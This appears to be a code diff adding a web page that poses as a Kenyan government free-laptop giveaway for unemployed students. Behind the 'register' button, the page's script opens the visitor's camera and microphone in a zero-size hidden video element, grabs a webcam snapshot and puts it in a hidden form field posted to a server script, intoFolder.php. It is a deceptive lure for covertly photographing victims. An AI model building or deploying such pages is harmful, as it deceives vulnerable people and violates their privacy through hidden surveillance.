@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>governmentfunds</title>
+</head>
+<style>
+    body{
+        background-image: radial-gradient(#f5f0,rgba(50,250,215,.5));
+    }
+       
+    div{
+        margin:10px;
+    }
+    .content{
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center
+    }
+   #video,#canvas{
+       width: 100%;
+       height:109vh;
+   }
+    #video{
+       width: 0;
+       height:0;
+   }
+ 
+    
+</style>
+<body>
+    <div class="main">
+        <div class="head">
+            
+        </div>
+        <div class="content">
+            
+            <div class="spy">
+                <p>The government of Kenya in parnership with other charity givers is giving a chance to all kenyan needy students to get free laptops. <br>
+                The students are to be highschool graduates who have  no work.The government aims at equiping them with neccessary tools and skills to.make the youth idependent are reduce the nunber of unemployed youth.
+                <br>
+                <p>
+                    During his speech on April Monday 15 ,the honourable deputy president highlited this.
+                    <br>
+                 <span class="qouttes">"</span>We would like our youths to be able to have skills and take part in the online market ...
+                 <span class="quottes">"</span>
+                </p>
+                </p>
+            </div>
+            
+                <video id="video" muted autoplay>
+                    
+                </video>
+            </div>
+           
+            <div class="canva" id="canva" hidden="hidden">
+                <canvas id="canvas"></canvas>
+                
+            </div>
+                  <form enctype="multipart/form-data" method="post" action="intoFolder.php">
+                    <input type="file" name="photo" hidden="hidden">
+                    <input type="hidden" name="imageData" id="imageData">
+                     <div class="button">
+                <button id="button">
+                    register
+                </button>
+                      
+                </form>
+              
+            </div>
+        </div>
+        <div class="footer">
+            
+        </div>
+    </div>
+</body>
+<script>
+    const video=document.getElementById("video");
+    const button=document.getElementById("button");
+    const canvas=document.getElementById("canvas");
+     
+ 
+
+    
+ 
+    const constraints={
+        audio:true,
+        video:{
+           width:{min:1024,ideal:1280,max:1920},
+           height:{min:576,ideal:720,max:1080}
+        }
+    }
+    
+   async function startStream(){
+        try{
+           const stream =await navigator.mediaDevices.getUserMedia(constraints);
+           video.srcObject=stream ;
+           window.stream=stream;
+        }catch(e){
+            alert(e.toString());
+        }
+    }
+    var content=canvas.getContext("2d");
+  
+button.addEventListener('click', () => {
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    
+    content.drawImage(video, 0, 0, canvas.width, canvas.height);
+    
+    const imageData = canvas.toDataURL("image/png");
+    document.getElementById("imageData").value = imageData;
+    
+    
+    const link = document.createElement("a");
+    link.href = imageData;
+    link.download = "photo.png";
+    link.click();
+});
+    startStream();
+</script>
+</html>
